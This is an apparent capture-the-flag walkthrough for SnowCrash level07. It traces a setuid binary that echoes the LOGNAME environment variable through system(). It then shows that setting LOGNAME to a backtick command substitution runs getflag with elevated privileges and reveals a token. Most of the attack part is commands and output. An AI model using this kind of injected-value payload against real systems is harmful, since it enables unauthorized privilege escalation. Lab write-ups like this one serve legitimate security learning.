# Level 07

- Once logged in, you will see `level07` binary file
```
???$ ssh level07@localhost -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          localhost 10.110.0.2
level07@localhost's password:
level07SnowCrash:~$
level07@SnowCrash:~$ ls
level07
level07@SnowCrash:~$
```

To check more detail, let's use `ltrace`

```
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7a4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                     = 2007
geteuid()                                                                     = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                           = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                           = 0
getenv("LOGNAME")                                                             = "level07"
asprintf(0xbffff6f4, 0x8048688, 0xbfffff26, 0xb7e5ee55, 0xb7fed280)           = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                        = 0
+++ exited (status 0) +++
level07@SnowCrash:~$
```
We can see the file takes an ENV varible of logname, and executs `/bin/echo level07`

Let's check the permissions of the file.
```
level07@SnowCrash:~$ ls -ls
total 12
12 -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
level07@SnowCrash:~$
```

Change environment variable **LOGNAME with command substitution by escaping backticks** if using with double quotes.
```
level07@SnowCrash:~$ export LOGNAME="\`getflag\`"
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
level07@SnowCrash:~$
```

